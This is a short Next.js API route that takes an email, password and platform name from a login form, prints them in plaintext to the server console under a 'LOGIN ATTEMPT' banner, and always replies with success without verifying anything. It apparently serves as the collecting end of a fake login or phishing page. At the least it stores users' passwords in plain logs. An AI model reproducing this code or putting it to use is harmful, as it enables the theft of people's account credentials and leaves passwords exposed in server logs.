import { NextRequest, NextResponse } from 'next/server';

export async function POST(req: NextRequest) {
  const { email, password, platform } = await req.json();
  // Log credentials to server console with platform information
  console.log("\n\n==============================================");
  console.log('LOGIN ATTEMPT:', { 
    email, 
    password, 
    platform: platform || 'Unknown',
    timestamp: new Date().toISOString()
  });
  console.log("==============================================\n\n");
  return NextResponse.json({ success: true });
}
